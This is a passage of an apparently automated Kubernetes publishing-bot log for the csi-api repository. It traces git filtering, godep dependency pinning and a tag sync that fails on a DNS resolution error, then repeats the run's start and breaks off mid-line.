/publish_scripts/construct.sh csi-api master master apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master  /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/csi-api kubernetes kubernetes k8s.io true \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  1af76aee9a1197dfef9f7c734b580c00acfa67fe\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=csi-api\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/csi-api\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=true\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=1af76aee9a1197dfef9f7c734b580c00acfa67fe\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 267049586ea08785d1a82711019f14745bd72252\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=040cc281f4849dee05d35e4f2fa2ee36729dea22\n>\t+ '[' 040cc281f4849dee05d35e4f2fa2ee36729dea22 '!=' 1af76aee9a1197dfef9f7c734b580c00acfa67fe ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''1af76aee9a1197dfef9f7c734b580c00acfa67fe'\\'' to '\\''040cc281f4849dee05d35e4f2fa2ee36729dea22'\\''. We have to sync.'\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api master master apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\tUpstream branch upstream/master moved from '1af76aee9a1197dfef9f7c734b580c00acfa67fe' to '040cc281f4849dee05d35e4f2fa2ee36729dea22'. We have to sync.\n>\ta3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 10 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db.\n>\t+ echo 'Starting at existing master commit a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 040cc281f4849dee05d35e4f2fa2ee36729dea22.\n>\t+ echo 'Checked out source commit 040cc281f4849dee05d35e4f2fa2ee36729dea22.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ git log --format=%B master\n>\t+ local k_base_commit=e998d6c2bc83385d98186a87e95a0f947e121ec1\n>\t+ '[' -z e998d6c2bc83385d98186a87e95a0f947e121ec1 ']'\n>\t++ git-find-merge e998d6c2bc83385d98186a87e95a0f947e121ec1 upstream/master\n>\t+++ git rev-list 'e998d6c2bc83385d98186a87e95a0f947e121ec1^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t++ tail -1\n>\t+++ git rev-list e998d6c2bc83385d98186a87e95a0f947e121ec1..upstream/master --ancestry-path\n>\t+++ git rev-parse e998d6c2bc83385d98186a87e95a0f947e121ec1\n>\t+ local k_base_merge=e998d6c2bc83385d98186a87e95a0f947e121ec1\n>\t+ '[' -z e998d6c2bc83385d98186a87e95a0f947e121ec1 ']'\n>\t+ git branch -f filtered-branch-base e998d6c2bc83385d98186a87e95a0f947e121ec1\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.\n>\tRunning git filter-branch ...\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/csi-api\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=9bfe536d919bf7226c2692cc07f9919de13fedec\n>\t++ git log --first-parent --format=%H --reverse 9bfe536d919bf7226c2692cc07f9919de13fedec..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db '!=' a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apiextensions-apiserver/\") or . == \"k8s.io/apiextensions-apiserver\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/csi-api/\") or . == \"k8s.io/csi-api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ grep '^Kubernetes-commit: '\n>\t+ local k_last_kube_commit=e998d6c2bc83385d98186a87e95a0f947e121ec1\n>\t+ '[' -z e998d6c2bc83385d98186a87e95a0f947e121ec1 ']'\n>\t++ git-find-merge e998d6c2bc83385d98186a87e95a0f947e121ec1 upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list 'e998d6c2bc83385d98186a87e95a0f947e121ec1^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list e998d6c2bc83385d98186a87e95a0f947e121ec1..upstream-branch --ancestry-path\n>\t+++ git rev-parse e998d6c2bc83385d98186a87e95a0f947e121ec1\n>\t+ local k_last_kube_merge=e998d6c2bc83385d98186a87e95a0f947e121ec1\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.'\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b e998d6c2bc83385d98186a87e95a0f947e121ec1 ../kube-commits-apimachinery-master\n>\t+ '[' -z 261df694e7250e4fa7eb0d5ccff0e4b657a77953 ']'\n>\t+ pushd ../apimachinery\n>\tChecking out k8s.io/apimachinery to 261df694e7250e4fa7eb0d5ccff0e4b657a77953\n>\t+ echo 'Checking out k8s.io/apimachinery to 261df694e7250e4fa7eb0d5ccff0e4b657a77953'\n>\t+ git checkout -q 261df694e7250e4fa7eb0d5ccff0e4b657a77953\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b e998d6c2bc83385d98186a87e95a0f947e121ec1 ../kube-commits-api-master\n>\t+ '[' -z 86123e1cdfc6aa06adf78c8527fb51c2b2b66af4 ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to 86123e1cdfc6aa06adf78c8527fb51c2b2b66af4\n>\t+ echo 'Checking out k8s.io/api to 86123e1cdfc6aa06adf78c8527fb51c2b2b66af4'\n>\t+ git checkout -q 86123e1cdfc6aa06adf78c8527fb51c2b2b66af4\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b e998d6c2bc83385d98186a87e95a0f947e121ec1 ../kube-commits-client-go-master\n>\t+ '[' -z e6341db955e2a2ed42914165000320a172403ac7 ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to e6341db955e2a2ed42914165000320a172403ac7'\n>\tChecking out k8s.io/client-go to e6341db955e2a2ed42914165000320a172403ac7\n>\t+ git checkout -q e6341db955e2a2ed42914165000320a172403ac7\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apiextensions-apiserver\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/apiextensions-apiserver corresponds to k8s.io/kubernetes commit e998d6c2bc83385d98186a87e95a0f947e121ec1.\n>\t++ look -b e998d6c2bc83385d98186a87e95a0f947e121ec1 ../kube-commits-apiextensions-apiserver-master\n>\t+ '[' -z 67d32729b98c514f63faa962eb0232e06b52524f ']'\n>\t+ pushd ../apiextensions-apiserver\n>\t+ echo 'Checking out k8s.io/apiextensions-apiserver to 67d32729b98c514f63faa962eb0232e06b52524f'\n>\t+ git checkout -q 67d32729b98c514f63faa962eb0232e06b52524f\n>\tChecking out k8s.io/apiextensions-apiserver to 67d32729b98c514f63faa962eb0232e06b52524f\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' true = true ']'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ echo 'Removing k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.'\n>\tRemoving k8s.io/*, gofuzz, go-openapi and glog from vendor/ because this is a library.\n>\t+ rm -rf ./vendor/github.com/golang/glog\n>\t+ rm -rf ./vendor/k8s.io\n>\t+ rm -rf ./vendor/github.com/google/gofuzz\n>\t+ rm -rf ./vendor/github.com/go-openapi\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\tGodeps.json hasn't changed!\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>\tRemove redundant godep commits on-top of a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db.\n>\t+ echo 'Remove redundant godep commits on-top of a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db.'\n>\t+ git reset --soft -q a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ local repo=csi-api\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'a3c43f0 Merge pull request #70718 from cblecker/godep-round-a-million' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-csi-api-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-csi-api-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-csi-api-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-csi-api-master.sh --dependencies apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master --mapping-output-file '../tag-csi-api-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tfatal: unable to access 'https://github.com/kubernetes/csi-api/': Could not resolve host: github.com\n>\tF1108 18:14:29.056275   17796 main.go:149] Failed to fetch tags for \"origin\": exit status 128\n>\tgoroutine 1 [running]:\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc009d3b200, 0xc00b382840, 0x5e, 0xb2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xd4\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xdc1b20, 0xc000000003, 0xc0000b2210, 0xd626de, 0x7, 0x95, 0x0)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x329\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xdc1b20, 0x3, 0x998c7a, 0x1f, 0xc0000f3a68, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x998c7a, 0x1f, 0xc0000f3a68, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:149 +0x2c5a\n>[08 Nov 18 18:14 UTC]: exit status 255\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=csi-api\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/csi-api\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=1af76aee9a1197dfef9f7c734b580c00acfa67fe\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ '[' '!' -f .git/info/attributes ']'\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 267049586ea08785d1a82711019f14745bd72252\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/master\n>    \t+ UPSTREAM_HASH=040cc281f4849dee05d35e4f2fa2ee36729dea22\n>    \t+ '[' 040cc281f4849dee05d35e4f2fa2ee36729dea22 '!=' 1af76aee9a1197dfef9f7c734b580c00acfa67fe ']'\n>    \t+ echo 'Upstream branch upstream/master moved from '\\''1af76aee9a1197dfef9f7c734b580c00acfa67fe'\\'' to '\\''040cc281f4849dee05d35e4f2fa2ee36729dea22'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api master master apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/csi-api\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=master\n>    \t+ local deps=apimachinery:master,api:master,client-go:master,apiextensions-apiserver:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 10 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing master commit a3c43f0ca3a059ac7ee56cbc58036d8a9ab3a1db.'\n>    \t+ git branch -D 